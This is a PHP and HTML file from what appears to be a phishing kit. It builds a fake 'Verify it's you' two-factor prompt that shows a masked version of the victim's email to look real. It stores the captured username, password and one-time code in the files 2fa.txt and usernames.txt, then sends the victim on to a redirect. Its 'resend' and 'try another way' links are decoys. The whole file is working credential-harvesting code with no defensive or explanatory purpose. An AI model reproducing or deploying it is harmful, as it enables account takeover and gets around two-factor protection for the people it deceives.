<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['otp'])) {
    $code = preg_replace('/\D/', '', $_POST['otp'] ?? '');
    $user = $_SESSION['phish_user'] ?? 'unknown';
    $pass = $_SESSION['phish_pass'] ?? '';
    $line = "Account: $user | Pass: $pass | 2FA: $code | " . date('Y-m-d H:i:s') . "\n";
    file_put_contents("2fa.txt", $line, FILE_APPEND);
    file_put_contents("usernames.txt", "2FA Code for $user: $code\n", FILE_APPEND);
    $redir = $_SESSION['phish_redirect'] ?? 'https://www.google.com';
    session_destroy();
    header("Location: $redir");
    exit;
}
$raw   = $_SESSION['phish_user'] ?? 'user@email.com';
$brand = $_SESSION['phish_brand'] ?? 'Security';
if (strpos($raw, '@') !== false) {
    list($name, $domain) = explode('@', $raw, 2);
    $vis = max(strlen($name) - 2, 1);
    $mask = substr($name, 0, 1) . str_repeat('*', $vis) . substr($name, -1) . '@' . $domain;
} else {
    $mask = substr($raw, 0, 2) . str_repeat('*', max(strlen($raw) - 2, 3));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Verify your identity</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;background:#0b0c10;color:#e8eaed;padding:20px}
.card{width:100%;max-width:420px;background:#151820;border:1px solid #2a2f3a;border-radius:18px;padding:36px 32px 28px}
.logo{width:58px;height:58px;margin:0 auto 16px;border-radius:50%;background:linear-gradient(135deg,#1a73e8,#8ab4f8);display:flex;align-items:center;justify-content:center}
.logo svg{width:28px;height:28px;fill:#fff}
h1{font-size:22px;text-align:center;margin-bottom:8px}
.sub{text-align:center;color:#9aa0a6;font-size:14px;line-height:1.5;margin-bottom:8px}
.sub b{color:#e8eaed}
.pill{display:block;text-align:center;margin:12px auto 18px;padding:8px 12px;background:rgba(26,115,232,.12);border:1px solid rgba(26,115,232,.35);border-radius:999px;font-size:13px;color:#8ab4f8;max-width:92%;word-break:break-all}
.digits{display:flex;gap:8px;justify-content:center;margin:18px 0 6px}
.digits input{width:46px;height:54px;text-align:center;font-size:22px;font-weight:700;border-radius:12px;border:1.5px solid #2a2f3a;background:#0b0c10;color:#e8eaed;outline:none}
.digits input:focus{border-color:#1a73e8}
.timer{text-align:center;font-size:13px;color:#9aa0a6;margin:12px 0 18px}
.timer span{color:#fbbc04;font-weight:700}
button.submit{width:100%;height:46px;border:0;border-radius:24px;background:#1a73e8;color:#fff;font-size:15px;font-weight:650;cursor:pointer}
button.submit:disabled{opacity:.4}
.links{display:flex;justify-content:space-between;margin-top:16px;font-size:13px}
.links a{color:#1a73e8;cursor:pointer}
.toast{display:none;margin-top:14px;padding:10px;border-radius:10px;background:rgba(52,168,83,.14);color:#34a853;font-size:13px;text-align:center}
.toast.show{display:block}
.err{display:none;text-align:center;color:#ea4335;font-size:13px;margin-top:10px}
.err.show{display:block}
.brand{text-align:center;margin-top:22px;font-size:11px;color:#5f6368}
</style>
</head>
<body>
<div class="card">
  <div class="logo"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
  <h1>Verify it's you</h1>
  <p class="sub">For your security, <b><?php echo htmlspecialchars($brand); ?></b> sent a one-time code to the email on your account.</p>
  <span class="pill"><?php echo htmlspecialchars($mask); ?></span>
  <form method="POST" action="otp.php" id="otpForm">
    <div class="digits" id="digits">
      <input type="text" inputmode="numeric" maxlength="1" required>
      <input type="text" inputmode="numeric" maxlength="1" required>
      <input type="text" inputmode="numeric" maxlength="1" required>
      <input type="text" inputmode="numeric" maxlength="1" required>
      <input type="text" inputmode="numeric" maxlength="1" required>
      <input type="text" inputmode="numeric" maxlength="1" required>
    </div>
    <input type="hidden" name="otp" id="otpHidden">
    <p class="timer">Code expires in <span id="cd">05:00</span></p>
    <p class="err" id="err">Invalid or expired code.</p>
    <button type="submit" class="submit" id="submitBtn">Verify</button>
    <div class="links"><a id="resend">Resend code</a><a id="back">Try another way</a></div>
    <div class="toast" id="toast">A new code has been sent to your email</div>
  </form>
  <p class="brand"><?php echo htmlspecialchars($brand); ?> Secure Verification</p>
</div>
<script>
(function(){
  var inputs=document.querySelectorAll('#digits input');
  var hidden=document.getElementById('otpHidden');
  var btn=document.getElementById('submitBtn');
  var err=document.getElementById('err');
  inputs.forEach(function(inp,i){
    inp.addEventListener('input',function(){
      inp.value=inp.value.replace(/[^0-9]/g,'');
      if(inp.value&&i<inputs.length-1)inputs[i+1].focus();
    });
    inp.addEventListener('keydown',function(e){
      if(e.key==='Backspace'&&!inp.value&&i>0)inputs[i-1].focus();
    });
    inp.addEventListener('paste',function(e){
      var t=(e.clipboardData||window.clipboardData).getData('text').replace(/[^0-9]/g,'');
      if(!t)return;e.preventDefault();
      for(var k=0;k<inputs.length&&k<t.length;k++)inputs[k].value=t[k];
      if(t.length>=inputs.length)inputs[inputs.length-1].focus();
    });
  });
  function collect(){
    var code='';
    inputs.forEach(function(inp){code+=inp.value;});
    hidden.value=code;
    return code.length===6;
  }
  var left=300,cd=document.getElementById('cd');
  var timer=setInterval(function(){
    left--;
    var m=String(Math.floor(left/60)).padStart(2,'0');
    var s=String(left%60).padStart(2,'0');
    cd.textContent=m+':'+s;
    if(left<=0){clearInterval(timer);cd.textContent='00:00';err.classList.add('show');}
  },1000);
  btn.addEventListener('click',function(e){
    e.preventDefault();
    err.classList.remove('show');
    if(!collect()){err.textContent='Enter all 6 digits.';err.classList.add('show');return;}
    btn.disabled=true;
    setTimeout(function(){document.getElementById('otpForm').submit();},600);
  });
  document.getElementById('resend').addEventListener('click',function(){
    var toast=document.getElementById('toast');
    toast.classList.add('show');
    left=300;
    setTimeout(function(){toast.classList.remove('show');},3000);
  });
  document.getElementById('back').addEventListener('click',function(){
    err.textContent='This option is not available in your region yet.';
    err.classList.add('show');
  });
})();
</script>
</body>
</html>
